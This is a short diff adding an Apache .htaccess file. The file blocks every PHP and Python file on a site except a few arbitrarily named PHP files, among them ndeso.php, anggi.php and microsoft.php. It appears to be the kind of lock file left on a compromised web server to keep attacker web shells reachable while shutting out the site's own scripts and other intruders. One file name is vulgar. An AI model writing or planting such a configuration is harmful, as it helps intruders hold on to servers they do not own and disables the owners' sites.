@@ -1,0 +1,9 @@
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*|py*)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(ndeso.php|basuki.php|vagina.php|anggi.php|anggi258.php|microsoft.php|index.html)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>
